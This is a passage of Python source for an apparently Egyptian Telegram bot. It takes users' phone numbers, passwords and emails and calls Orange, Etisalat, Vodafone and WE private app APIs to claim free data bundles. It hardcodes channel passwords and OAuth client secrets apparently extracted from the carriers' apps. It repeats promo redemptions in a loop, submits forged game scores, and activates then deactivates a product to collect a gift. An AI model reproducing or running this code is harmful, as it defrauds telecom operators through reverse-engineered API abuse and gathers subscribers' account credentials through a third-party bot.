        h = hashlib.sha256((ctv + ",{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk").encode()).hexdigest()
        htv = h.upper()
        url4 = "https://services.orange.eg/APIs/Promotions/api/CAF/Redeem"
        headers4 = {
            "_ctv": ctv,
            "_htv": htv,
            "isEasyLogin": "false",
            "UserId": fox,
            "Content-Type": "application/json; charset=UTF-8",
            "Host": "services.orange.eg",
            'User-Agent': "okhttpwhitepro/3.12.1"
        }
        json4 = {
            "Language": "ar",
            "OSVersion": "Android7.0",
            "PromoCode": "رمضان كريم",
            "dial": number,
            "password": password,
            "Channelname": "MobinilAndMe",
            "ChannelPassword": "ig3yh*mk5l42@oj7QAR8yF"
        }
        response4 = requests.post(url4, headers=headers4, json=json4)
        ErrorDescription = response4.json()['ErrorDescription']
        if ErrorDescription == "Success":
            return "✅ تم تفعيل 524MG بنجاح! 🎉"
        elif ErrorDescription == "User is redeemed before":
            return "⚠️ لقد قمت بتفعيل 524MG من قبل"
        else:
            return f"❌ خطأ: {ErrorDescription}"
    except Exception as e:
        return f"❌ حدث خطأ: {str(e)}"

def check_merida_offer(mobile_number, chat_id):
    show_progress(chat_id)
    try:
        url = "https://api.meridagame.com/api/speedRedeemOffer"
        headers = {
            "Host": "api.meridagame.com",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Android\"",
            'User-Agent': "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://speed.meridagame.com",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://speed.meridagame.com/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "ar,en-US;q=0.9,en;q=0.8,de;q=0.7"
        }
        data = {
            "msisdn": mobile_number,
            "txid": "a22c5115-f2ee-4fb5-9cda-86dd351e7f17",
            "lang": "ar"
        }
        response = requests.post(url, headers=headers, data=data)
        res_json = response.json()
        if res_json.get("status") is True:
            error_desc = res_json.get("data", {}).get("redeemOutputs", {}).get("RedeemErrorDoc", {}).get("errDesc", "")
            if "capping capacity" in error_desc:
                return "😢 أنتَ واخد العرض قبل كده."
            elif "PE" in error_desc or "err" in error_desc.lower():
                return "🚫 الرقم غير مؤهل للعرض."
            else:
                return "🎉 مبروووك جالك 1000 ميجا سوشيل ♥️😚"
        else:
            return "⚠️ فيه خطأ في تنفيذ الطلب أو البيانات غير صحيحة."
    except Exception as e:
        return f"❌ حصل خطأ أثناء تنفيذ الطلب:\n{str(e)}"

def spin_wheel(number, password, chat_id):
    show_progress(chat_id)
    try:
        url2 = "https://services.orange.eg/GetToken.svc/GenerateToken"
        headers2 = {
            "Content-Type": "application/json; charset=UTF-8",
            'Accept-Encoding': "gzip",
            'User-Agent': "okhttp/3.14.9",
        }
        data2 = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
        response = requests.post(url2, headers=headers2, data=data2)
        response_data = response.json()
        ctv1 = response_data["GenerateTokenResult"]
        ctv = ctv1["Token"]
        hash_input = ctv + ",{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk"
        hashed_value = hashlib.sha256(hash_input.encode()).hexdigest()
        htv = hashed_value.upper()

        url = "https://services.orange.eg/APIs/Gaming/api/WheelOfFortune/Spin"
        payload = json.dumps({
            "ChannelName": "MobinilAndMe",
            "ChannelPassword": "ig3yh*mk5l42@oj7QAR8yF",
            "Dial": number,
            "Language": "en",
            "Password": password,
            "ServiceClassId": "1033"
        })
        headers = {
            'User-Agent': "okhttp/3.14.9",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'IsAndroid': "true",
            'OsVersion': "9",
            'AppVersion': "7.2.0",
            '_ctv': ctv,
            '_htv': htv,
            'isEasyLogin': "false",
            'net-msg-id': "571a4fd0009404d17234055471481049",
            'x-microservice-name': "APMS",
            'Content-Type': "application/json; charset=UTF-8"
        }
        response = requests.post(url, data=payload, headers=headers)
        if "ErrorDescription" in response.json():
            error = response.json()['ErrorDescription']
            if error == "reach the max spins today":
                return "⚠️ لقد استهلكت المحاولات الثلاث اليومية لعجلة الحظ"
            else:
                return "⚠️ لقد استهلكت المحاولات الثلاث اليومية لعجلة الحظ"
        offer = response.json()["OfferDetails"]["OfferId"]
        CategoryId = response.json()["SecondryButtonDetails"]["CategoryId"]
        offer_name = response.json()["OfferDetails"]["OfferName"]
        time.sleep(2)
        response = requests.post(url2, headers=headers2, data=data2)
        response_data = response.json()
        ctv1 = response_data["GenerateTokenResult"]
        ctv = ctv1["Token"]
        hash_input = ctv + ",{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk"
        hashed_value = hashlib.sha256(hash_input.encode()).hexdigest()
        htv = hashed_value.upper()
        url = "https://services.orange.eg/APIs/Gaming/api/WheelOfFortune/Fulfill"
        payload = json.dumps({
            "CategoryId": CategoryId,
            "ChannelName": "MobinilAndMe",
            "ChannelPassword": "ig3yh*mk5l42@oj7QAR8yF",
            "Dial": number,
            "Language": "en",
            "OfferId": offer,
            "Password": password,
            "ServiceClassId": "1033"
        })
        headers = {
            'User-Agent': "okhttp/3.14.9",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'IsAndroid': "true",
            'OsVersion': "9",
            'AppVersion': "7.2.0",
            '_ctv': ctv,
            '_htv': htv,
            'isEasyLogin': "false",
            'net-msg-id': "571a4fd0009404d17234055661551053",
            'x-microservice-name': "APMS",
            'Content-Type': "application/json; charset=UTF-8"
        }
        response = requests.post(url, data=payload, headers=headers)
        if "Already opted in" in str(response.json()):
            return f"🎡 عجلة الحظ:\n{offer_name}\n⚠️ أنت مشترك بالفعل في هذا العرض"
        else:
            return f"🎡 عجلة الحظ:\n{offer_name}\n✅ تم الاشتراك في العرض بنجاح"
    except Exception as e:
        return f"❌ حدث خطأ أثناء تشغيل عجلة الحظ:\n{str(e)}"

def redeem_orange_business_gifts(number, password, chat_id):
    show_progress(chat_id)
    try:
        url = "https://services.orange.eg/SignIn.svc/SignInUser"
        payload = {
            "appVersion": "8.8.5",
            "channel": {
                "ChannelName": "MobinilAndMe",
                "Password": "ig3yh*mk5l42@oj7QAR8yF"
            },
            "dialNumber": number,
            "isAndroid": True,
            "lang": "ar",
            "password": password,
        }
        headers = {
            'User-Agent': "okhttp/4.10.0",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8"
        }
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        try:
            fox = response.json()['SignInUserResult']['AccessToken']
        except:
            return "❌ الرقم أو كلمة المرور غير صحيحة"

        url = "https://services.orange.eg/APIs/Gaming/api/Gamification/GetDailyGifts"
        payload = {
            "ChannelName": "MobinilAndMe",
            "ChannelPassword": "ig3yh*mk5l42@oj7QAR8yF",
            "Dial": number,
            "Language": "ar",
            "Password": password
        }
        headers = {
            'User-Agent': "okhttp/4.10.0",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'IsAndroid': "true",
            'OsVersion': "12",
            'AppVersion': "9.0.0",
            'isEasyLogin': "false",
            'Token': fox,
            'Content-Type': "application/json; charset=UTF-8"
        }
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        try:
            Id = response.json()["Result"]["Gifts"][0]["Id"]
            Day = response.json()["Result"]["Gifts"][0]["Day"]
            LongDescription = response.json()["Result"]["Gifts"][0]["LongDescription"]
        except:
            errr = response.json().get('ErrorDescription', 'خطأ غير معروف')
            return f"❌ خطأ: {errr}"

        url = "https://services.orange.eg/APIs/Gaming/api/Gamification/RedeemDailyGift"
        payload = {
            "ChannelName": "MobinilAndMe",
            "ChannelPassword": "ig3yh*mk5l42@oj7QAR8yF",
            "Day": Day,
            "Dial": number,
            "GiftId": Id,
            "Language": "ar",
            "Password": number,
        }
        headers = {
            'User-Agent': "okhttp/4.10.0",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'IsAndroid': "true",
            'OsVersion': "13",
            'AppVersion': "9.0.0",
            'isEasyLogin': "false",
            'Token': fox,
            'Content-Type': "application/json; charset=UTF-8"
        }
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        success_msg = "لقد حصلت علي 1000 ميجابايتس مجانآ صالحة لنهاية اليوم\r\nلا تنس تسجيل الدخول غدا للحصول على الهدية اليومية"
        if success_msg in response.json().get('ErrorDescription', ''):
            succes = response.json()['ErrorDescription']
            return f"🎁 {LongDescription}\n✅ {succes}"
        else:
            errr = response.json().get('ErrorDescription', 'حدث خطأ أثناء تنفيذ الطلب')
            return f"❌ {errr}"
    except Exception as e:
        return f"❌ حدث خطأ: {str(e)}"

def activate_orange_2000mb(number, password, serial, chat_id):
    try:
        wait_msg = bot.send_message(chat_id, "⏳ جاري تفعيل 2000MB...\nمتنساناش بالاسكرين \n@Maro_330")
        url = "https://services.orange.eg/SignIn.svc/SignInUser"
        payload = {
            "appVersion": "9.3.0",
            "channel": {
                "ChannelName": "MobinilAndMe",
                "Password": "ig3yh*mk5l42@oj7QAR8yF"
            },
            "dialNumber": number,
            "isAndroid": True,
            "lang": "ar",
            "password": password,
        }
        headers = {
            'User-Agent': "okhttp/4.10.0",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8"
        }
        response = requests.post(url, json=payload, headers=headers, timeout=30)
        response.raise_for_status()
        response_data = response.json()
        if 'SignInUserResult' not in response_data or 'AccessToken' not in response_data['SignInUserResult']:
            bot.edit_message_text("❌ فشل تسجيل الدخول. تأكد من الرقم وكلمة المرور.", chat_id, wait_msg.message_id)
            return
        token = response_data['SignInUserResult']['AccessToken']
        url = "https://services.orange.eg/APIs/Profile/api/UserSubDials/CheckSIMSerial"
        payload = {
            "ChannelName": "MobinilAndMe",
            "ChannelPassword": "ig3yh*mk5l42@oj7QAR8yF",
            "Home4gDial": number,
            "Home4gSimSerial": serial,
            "Language": "ar",
            "VoiceDial": number,
        }
        headers = {
            'User-Agent': "okhttp/4.10.0",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'IsAndroid': "true",
            'OsVersion': "13",
            'AppVersion': "9.4.0",
            'isEasyLogin': "true",
            'Token': token,
        }
        response = requests.post(url, json=payload, headers=headers, timeout=30)
        response_data = response.json()
        try:
            bot.delete_message(chat_id, wait_msg.message_id)
        except:
            pass
        if response_data.get('ErrorDescription') == "Success":
            return "✅ تم تفعيل 2000MB بنجاح! 🎉"
        else:
            error_msg = response_data.get('ErrorDescription', 'حدث خطأ غير معروف')
            return f"❌ فشل التفعيل: {error_msg}"
    except requests.exceptions.RequestException as e:
        return f"❌ خطأ في الاتصال: {str(e)}"
    except Exception as e:
        return f"❌ حدث خطأ غير متوقع: {str(e)}"

def redeem_etisalat_500mg(number, password, email, chat_id):
    show_progress(chat_id)
    try:
        auth_str = f"{email}:{password}"
        headers = {
            "Authorization": f"Basic {b64encode(auth_str.encode()).decode()}",
            "Content-Type": "text/xml; charset=UTF-8",
            "applicationName": "MAB",
            "APP-Version": "27.0.0",
            "OS-Type": "Android",
            'User-Agent': "okhttp/5.0.0-alpha.11"
        }
        data = """
        <loginRequest>
            <deviceId></deviceId>
            <firstLoginAttempt>true</firstLoginAttempt>
            <platform>Android</platform>
            <udid></udid>
        </loginRequest>
        """
        response = requests.post(
            "https://mab.etisalat.com.eg:11003/Saytar/rest/authentication/loginWithPlan",
            headers=headers,
            data=data,
            timeout=30
        )
        if response.status_code != 200:
            return f"❌ خطأ في الخادم (كود {response.status_code})"
        if "true" not in response.text:
            return "❌ بيانات الدخول غير صحيحة"
        headers = {
            "Authorization": f"Basic {b64encode(auth_str.encode()).decode()}",
            "Content-Type": "text/xml; charset=UTF-8",
            "applicationName": "MAB",
            "APP-Version": "30.2.0",
            "OS-Type": "Android",
            'User-Agent': "okhttp/5.0.0-alpha.11",
            "Language": "ar"
        }
        msisdn = number[1:] if number.startswith('0') else number
        data = f"""
        <submitOrderRequest>
            <mabOperation></mabOperation>
            <msisdn>{msisdn}</msisdn>
            <operation>REDEEM</operation>
            <productName>DOWNLOAD_GIFT_1_SOCIAL_UNITS</productName>
        </submitOrderRequest>
        """
        response = requests.post(
            "https://mab.etisalat.com.eg:11003/Saytar/rest/servicemanagement/submitOrderV2",
            headers=headers,
            data=data,
            timeout=30
        )
        if response.status_code != 200:
            return f"❌ خطأ في الخادم (كود {response.status_code})"
        if "true" not in response.text:
            return "❌ فشل في التفعيل (قد يكون العرض غير متاح)"
        return "✅ تم تفعيل 500 ميجا من Etisalat بنجاح! 🎉"
    except requests.exceptions.Timeout:
        return "❌ انتهى وقت الانتظار"
    except Exception as e:
        return f"❌ حدث خطأ تقني: {str(e)}"

def redeem_etisalat_streaming(number, password, email, chat_id):
    show_progress(chat_id)
    try:
        auth_str = f"{email}:{password}"
        headers = {
            "Authorization": f"Basic {b64encode(auth_str.encode()).decode()}",
            "Content-Type": "text/xml; charset=UTF-8",
            "applicationName": "MAB",
            "APP-Version": "27.0.0",
            "OS-Type": "Android",
            'User-Aster': "okhttp/5.0.0-alpha.11"
        }
        data = """
        <loginRequest>
            <deviceId></deviceId>
            <firstLoginAttempt>true</firstLoginAttempt>
            <platform>Android</platform>
            <udid></udid>
        </loginRequest>
        """
        res = requests.post(
            "https://mab.etisalat.com.eg:11003/Saytar/rest/authentication/loginWithPlan",
            headers=headers,
            data=data,
            timeout=30
        )
        if res.status_code != 200 or "true" not in res.text:
            return "❌ بيانات الدخول غير صحيحة أو خطأ في الخادم."
        headers = {
            "Authorization": f"Basic {b64encode(auth_str.encode()).decode()}",
            "Content-Type": "text/xml; charset=UTF-8",
            "applicationName": "MAB",
            "APP-Version": "30.2.0",
            "OS-Type": "Android",
            'User-Agent': "okhttp/5.0.0-alpha.11",
            "Language": "ar"
        }
        msisdn = number[1:] if number.startswith('0') else number
        xml_payload = f"""<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
        <submitOrderRequest>
            <mabOperation></mabOperation>
            <msisdn>{msisdn}</msisdn>
            <operation>REDEEM</operation>
            <productName>DOWNLOAD_GIFT_2_STREAMING_UNITS</productName>
        </submitOrderRequest>"""
        response = requests.post(
            "https://mab.etisalat.com.eg:11003/Saytar/rest/servicemanagement/submitOrderV2",
            headers=headers,
            data=xml_payload,
            timeout=30
        )
        if response.status_code != 200:
            return f"❌ فشل الاتصال بالسيرفر (كود {response.status_code})"
        if "<success>true</success>" in response.text:
            return "✅ تم تفعيل عرض 500 وحدة Streaming بنجاح!"
        elif "Already activated" in response.text or "already used" in response.text:
            return "ℹ️ تم تفعيل العرض لهذا الرقم من قبل."
        else:
            return "⚠️ العرض غير متاح حالياً أو فشل التنفيذ."
    except requests.exceptions.Timeout:
        return "❌ انتهى وقت الانتظار"
    except Exception as e:
        return f"❌ حدث خطأ تقني: {str(e)}"

def redeem_etisalat_100_units(email, password, chat_id):
    show_progress(chat_id)
    try:
        def make_headers(token):
            return {
                'User-Agent': "okhttp/5.0.0-alpha.11",
                'Connection': "Keep-Alive",
                'Accept': "text/xml",
                'Accept-Encoding': "gzip",
                'Content-Type': "text/xml; charset=UTF-8",
                'Authorization': f"Basic {token}",
                'Language': "ar",
                'APP-BuildNumber': "10650",
                'APP-Version': "33.1.0",
                'OS-Type': "Android",
                'OS-Version': "13",
                'APP-STORE': "GOOGLE",
                'C-Type': "4G",
                'Is-Corporate': "false",
                'ADRUM_1': "isMobile:true",
                'ADRUM': "isAjax:true"
            }
        tok = f"{email}:{password}"
        token = base64.b64encode(tok.encode()).decode()
        headers = make_headers(token)
        fox_login = """<?xml version='1.0' encoding='UTF-8' standalone='yes' ?>
        <loginRequest>
            <deviceId></deviceId>
            <firstLoginAttempt>false</firstLoginAttempt>
            <modelType></modelType>
            <osVersion></osVersion>
            <platform>Android</platform>
            <udid></udid>
        </loginRequest>"""
        r = requests.post(
            "https://mab.etisalat.com.eg:11003/Saytar/rest/authentication/loginWithPlan",
            data=fox_login,
            headers=headers,
            timeout=15
        )
        xml = ET.fromstring(r.text)
        dial = xml.find(".//dial")
        if dial is None or dial.text is None:
            return "❌ فشل تسجيل الدخول. تأكد من البريد الإلكتروني وكلمة المرور."
        number = dial.text
        url = "https://mab.etisalat.com.eg:11003/Saytar/rest/zero11/submitOrder"
        payload = f"""<?xml version='1.0' encoding='UTF-8' standalone='yes' ?>
        <submitOrderRequest>
            <mabOperation></mabOperation>
            <msisdn>{number}</msisdn>
            <operation>ACTIVATE</operation>
            <parameters>
                <parameter>
                    <name>Offer_ID</name>
                    <value>23214</value>
                </parameter>
                <parameter>
                    <name>isRTIM</name>
                    <value>Y</value>
                </parameter>
            </parameters>
            <productName>TWIST_TV</productName>
        </submitOrderRequest>"""
        headers = make_headers(token)
        response = requests.post(url, data=payload, headers=headers, timeout=15)
        try:
            root = ET.fromstring(response.text)
            status = root.find(".//status")
            if status is not None and status.text.lower() == "true":
                deactivate_url = "https://mab.etisalat.com.eg:11003/Saytar/rest/servicemanagement/subscribedServicesSubmitOrder"
                deactivate_payload = f"""<?xml version='1.0' encoding='UTF-8' standalone='yes' ?>
                <submitOrderRequest>
                    <mabOperation></mabOperation>
                    <msisdn>{number}</msisdn>
                    <operation>DEACTIVATE</operation>
                    <parameters />
                    <productName>TWIST_TV</productName>
                </submitOrderRequest>"""
                deactivate_response = requests.post(deactivate_url, data=deactivate_payload, headers=headers, timeout=15)
                return "✅ تم تفعيل هدية 100 وحدة بنجاح"
            else:
                return "❌ فشل في تفعيل الهدية. قد تكون غير متاحة لخطك."
        except Exception as e:
            return f"❌ حدث خطأ أثناء المعالجة: {str(e)}"
    except Exception as e:
        return f"❌ حدث خطأ: {str(e)}"

def redeem_etisalat_daily_gift(email, password, chat_id):
    show_progress(chat_id)
    try:
        def make_headers(token):
            return {
                'Host': "mab.etisalat.com.eg:11003",
                'User-Agent': "okhttp/5.0.0-alpha.11",
                'Connection': "Keep-Alive",
                'Accept': "text/xml",
                'Accept-Encoding': "gzip",
                'Content-Type': "text/xml; charset=UTF-8",
                'applicationVersion': "2",
                'applicationName': "MAB",
                'Authorization': f"Basic {token}",
                'Language': "ar",
                'APP-BuildNumber': "10650",
                'APP-Version': "33.1.0",
                'OS-Type': "Android",
                'OS-Version': "13",
                'APP-STORE': "GOOGLE",
                'C-Type': "4G",
                'Is-Corporate': "false",
                'ADRUM_1': "isMobile:true",
                'ADRUM': "isAjax:true"
            }
        tok = f"{email}:{password}"
        token = base64.b64encode(tok.encode()).decode()
        headers = make_headers(token)
        fox_login = """<?xml version='1.0' encoding='UTF-8' standalone='yes' ?>
        <loginRequest>
            <deviceId></deviceId>
            <firstLoginAttempt>false</firstLoginAttempt>
            <modelType></modelType>
            <osVersion></osVersion>
            <platform>Android</platform>
            <udid></udid>
        </loginRequest>"""
        r = requests.post(
            "https://mab.etisalat.com.eg:11003/Saytar/rest/authentication/loginWithPlan",
            data=fox_login,
            headers=headers,
            timeout=15
        )
        try:
            xml = ET.fromstring(r.text)
            dial = xml.find("dial")
            if dial is None or dial.text is None:
                return "❌ فشل تسجيل الدخول. تأكد من البريد الإلكتروني وكلمة المرور."
            number = dial.text
            url_gift = f"https://mab.etisalat.com.eg:11003/Saytar/rest/dailyTipsWS/dailyTipsExtraGift?req=%3CdialAndLanguageRequest%3E%3CsubscriberNumber%3E{number}%3C%2FsubscriberNumber%3E%3Clanguage%3E1%3C%2Flanguage%3E%3C%2FdialAndLanguageRequest%3E"
            headers_gift = make_headers(token)
            response_gift = requests.get(url_gift, headers=headers_gift)
            root = ET.fromstring(response_gift.text)
            daily_gifts = root.findall(".//dailyGift")
            result_message = "🎁 الهدايا اليومية:\n\n"
            activated = False
            for gift in daily_gifts:
                redeemed = gift.find("redeemed").text.lower()
                params = gift.find("params")
                gift_id_elem = params.find(".//param[name='GIFT_ID']/value") if params is not None else None
                amount_elem = params.find(".//param[name='AMOUNT']/value") if params is not None else None
                gift_id = gift_id_elem.text if gift_id_elem is not None else "غير معروف"
                amount = amount_elem.text if amount_elem is not None else "غير معروف"
                if redeemed == "true":
                    result_message += f"✅ {amount} ميجا - متفعلة بالفعل\n"
                elif redeemed == "false" and not activated:
                    url_submit = "https://mab.etisalat.com.eg:11003/Saytar/rest/dailyTipsWS/submitOrder"
                    payload = f"""<?xml version='1.0' encoding='UTF-8' standalone='yes' ?>
                    <dailyTipsSubmitRequest>
                        <operationId>REDEEM</operationId>
                        <params>
                            <param><name>GIFT_ID</name><value>{gift_id}</value></param>
                            <param><name>AMOUNT</name><value>{amount}</value></param>
                            <param><name>GIFT_TYPE</name><value>DailyTip</value></param>
                            <param><name>GIFT_CATEGORY</name><value>Main</value></param>
                        </params>
                        <productId>DAILY_TIPS_GIFT</productId>
                        <subscriberNumber>{number}</subscriberNumber>
                    </dailyTipsSubmitRequest>"""
                    headers_submit = make_headers(token)
                    headers_submit['Content-Type'] = "text/xml; charset=UTF-8"
                    response_submit = requests.post(url_submit, data=payload, headers=headers_submit)
                    try:
                        xml_submit = ET.fromstring(response_submit.text)
                        status = xml_submit.find("status")
                        if status is not None and status.text.lower() == "true":
                            result_message += f"🎉 {amount} ميجا - تم التفعيل بنجاح!\n"
                            activated = True
                        else:
                            result_message += f"❌ {amount} ميجا - فشل التفعيل\n"
                    except:
                        result_message += f"❌ {amount} ميجا - خطأ في الاستجابة\n"
                else:
                    result_message += f"📦 {amount} ميجا - غير متاحة للتفعيل\n"
            if not activated:
                result_message += "\n⚠️ لا توجد هدايا متاحة للتفعيل اليوم"
            return result_message
        except ET.ParseError:
            return "❌ خطأ في معالجة البيانات من السيرفر"
        except Exception as e:
            return f"❌ حدث خطأ: {str(e)}"
    except Exception as e:
        return f"❌ حدث خطأ: {str(e)}"

def get_we_line_info(number, password, chat_id):
    show_progress(chat_id)
    try:
        if number.startswith("0"):
            number = number[1:]
        url = "https://my.te.eg/echannel/service/besapp/base/rest/busiservice/v1/auth/userAuthenticate"
        payload = {
            "acctId": number,
            "password": password,
            "appLocale": "en-US",
            "isSelfcare": "Y",
            "isMobile": "N",
            "recaptchaToken": ""
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Content-Type': "application/json",
            'sec-ch-ua': "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
            'delegatorSubsId': "",
            'csrftoken': "",
            'sec-ch-ua-mobile': "?1",
            'isMobile': "false",
            'isSelfcare': "true",
            'channelId': "702",
            'isCoporate': "false",
            'languageCode': "en-US",
            'clientType': "Chrome",
            'sec-ch-ua-platform': "\"Android\"",
            'Origin': "https://my.te.eg",
            'Sec-Fetch-Site': "same-origin",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://my.te.eg/echannel/",
            'Accept-Language': "ar-EG,ar;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
        }
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        data = response.json()
        subscriber_number = data['body']['subscriber']['servNumber']
        customer_name = data['body']['customer']['custName']
        written_lang = data['body']['subscriber']['writtenLang']
        return f"""
📱 معلومات خط WE:
- رقم الخط: {subscriber_number}
- الاسم الكامل: {customer_name}
- نظام الخط: {written_lang}
        """
    except Exception as e:
        return f"❌ حدث خطأ: {str(e)}"

def redeem_vodafone_250mg(number, password, chat_id):
    show_progress(chat_id)
    try:
        url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
        payload = {
            'username': number,
            'password': password,
            'grant_type': "password",
            'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
            'client_id': "ana-vodafone-app"
        }
        headers = {
            'User-Agent': "okhttp/4.11.0",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip",
            'silentLogin': "true",
            'x-dynatrace': "MT_3_24_1131333938_226-0_a556db1b-4506-43f3-854a-1d2527767923_0_193_104",
            'x-agent-operatingsystem': "13",
            'clientId': "AnaVodafoneAndroid",
            'Accept-Language': "ar",
            'x-agent-device': "Xiaomi 21061119AG",
            'x-agent-version': "2024.12.1",
            'x-agent-build': "946",
            'digitalId': "28RI9U7IG5T6D"
        }
        response = requests.post(url, data=payload, headers=headers)
        result = response.json()
        try:
            token = result['access_token']
        except:
            return "❌ فشل تسجيل الدخول! تأكد من الرقم وكلمة المرور."
        url = f"https://web.vodafone.com.eg/services/dxl/promo/promotion?@type=Promo&$.context.type=5G_Promo&$.characteristics%5B@name%3DcustomerNumber%5D.value={number}"
        headers.update({
            'User-Agent': "vodafoneandroid",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-platform': "\"Android\"",
            'Authorization': f"Bearer {token}",
            'msisdn': number,
            'sec-ch-ua': "\"Android WebView\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
            'clientId': "WebsiteConsumer",
            'sec-ch-ua-mobile': "?1",
            'channel': "APP_PORTAL",
            'Content-Type': "application/json",
            'X-Requested-With': "com.emeint.android.myservices",
            'Sec-Fetch-Site': "same-origin",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://web.vodafone.com.eg/portal/bf/5gGame"
        })
        data = requests.get(url, headers=headers).json()
        current_level = None
        scores = []
        for item in data:
            for characteristic in item.get("characteristics", []):
                name = characteristic.get("name")
                value = characteristic.get("value")
                if name == "currentLevel":
                    current_level = value
                elif name == "scores":
                    scores = list(map(int, value.split(',')))
        level = current_level if current_level else "1"
        scores = max(scores) if scores else "50"
        url = "https://web.vodafone.com.eg/services/dxl/promo/promotion"
        payload = {
            "@type": "Promo",
            "channel": {
                "id": "APP_PORTAL"
            },
            "context": {
                "type": "5G_Promo"
            },
            "pattern": [
                {
                    "characteristics": [
                        {
                            "name": "level",
                            "value": level
                        },
                        {
                            "name": "score",
                            "value": scores
                        },
                        {
                            "name": "customerNumber",
                            "value": number
                        }
                    ]
                }
            ]
        }
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        try:
            id = response.json()['id']
            mg = response.json()["characteristics"][0]["value"]
        except:
            return "⚠️ لقد استخدمت هذه الهدية اليوم بالفعل"
        url = f"https://web.vodafone.com.eg/services/dxl/promo/promotion/{id}"
        payload = {
            "@type": "Promo",
            "channel": {
                "id": "APP_PORTAL"
            },
            "context": {
                "type": "5G_Promo"
            },
            "pattern": [
                {
                    "characteristics": [
                        {
                            "name": "customerNumber",
                            "value": number
                        }
                    ]
                }
            ]
        }
        response = requests.patch(url, data=json.dumps(payload), headers=headers)
        if response.status_code == 204:
            return f"✅ تم تفعيل {mg}MG بنجاح! 🎉"
        else:
            return f"❌ خطأ في التفعيل: {response.text}"
    except requests.exceptions.RequestException as e:
        return f"❌ حدث خطأ في الاتصال: {str(e)}"
    except Exception as e:
        return f"❌ حدث خطأ غير متوقع: {str(e)}"

def redeem_vodafone_gifts(number, password, chat_id):
    show_progress(chat_id)
    try:
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Connection": "keep-alive",
            "x-dynatrace": "MT_3_13_3830690492_8-0_a556db1b-4506-43f3-854a-1d2527767923_0_16912_686",
            "x-agent-operatingsystem": "V12.0.17.0.QJQMIXM",
            "clientId": "xxx",
            "x-agent-device": "lime",
            "x-agent-version": "2024.10.1",
            'x-agent-build': "500",
            'Content-Type': "application/x-www-form-urlencoded",
            'Host': "mobile.vodafone.com.eg",
            'User-Agent': "okhttp/4.9.1",
        }
        data = {
            "grant_type": "password",
            "client_secret": "a2ec6fff-0b7f-4aa4-a733-96ceae5c84c3",
            "client_id": "my-vodafone-app",
            "username": number,
            "password": password,
        }
        response = requests.post(
            "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token",
            headers=headers,
            data=data
        )
        if response.status_code != 200:
            return "❌ فشل تسجيل الدخول! تأكد من الرقم وكلمة المرور."
        access_token = response.json()['access_token']
        headers.update({
            "Authorization": f"Bearer {access_token}",
            "hash": "VKLWBIORyzjYOpVrxVdYgZbnvpfLSm/qPzMHDqXS+4U=",
            'Content-Type': "application/json; charset=UTF-8",
        })
        promo_data = {
            "promoId": "2633",
            "channelId": "1",
            "wlistId": "2553",
            "contextualPromoId": "13",
            "triggerId": "189",
            "param3": "0.5",
            "param4": "1",
            "param6": "0",
            "param1": "5",
            "param2": "50",
        }
        success_count = 0
        for _ in range(6):
            response = requests.post(
                "https://mobile.vodafone.com.eg/mobile-app/promo/unifiedRedeemPromo?lang=ar",
                headers=headers,
                json=promo_data
            )
            if response.status_code == 200:
                success_count += 1
        if success_count > 0:
            return f"✅ تم تفعيل {success_count} من هدايا فودافون بنجاح! 🎉"
        else:
            return "❌ فشل في تفعيل هدايا فودافون"
    except Exception as e:
        return f"❌ حدث خطأ: {str(e)}"

def redeem_vodafone_plus_discount(number, password, chat_id):
    show_progress(chat_id)
    try:
        url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
        payload = {
            'username': number,
            'password': password,
            'grant_type': 'password',
